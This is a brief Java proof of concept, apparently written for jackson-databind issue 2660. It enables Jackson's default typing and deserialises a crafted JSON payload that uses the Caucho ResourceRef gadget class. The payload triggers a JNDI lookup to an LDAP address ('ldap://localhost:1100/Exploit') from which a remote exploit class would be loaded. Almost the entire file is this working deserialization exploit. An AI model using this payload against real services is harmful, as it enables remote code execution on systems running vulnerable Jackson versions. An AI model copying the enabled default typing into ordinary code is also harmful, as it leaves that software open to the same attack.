import com.fasterxml.jackson.databind.ObjectMapper;

/**
 * Title: JacksonMain
 * Descrption: https://github.com/FasterXML/jackson-databind/issues/2660
 * Date:2020/3/23 6:48 下午
 * Email:woo0nise@gmail.com
 * Company:www.j2ee.app
 *
 * @author R4v3zn
 * @version 1.0.0
 */
public class JacksonMain {
    public static void main(String[] args) throws Exception {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        String json = "[\"com.caucho.config.types.ResourceRef\", {\"lookupName\": \"ldap://localhost:1100/Exploit\"}]";
        Object o = mapper.readValue(json, Object.class);
        mapper.writeValueAsString(o);
    }
}
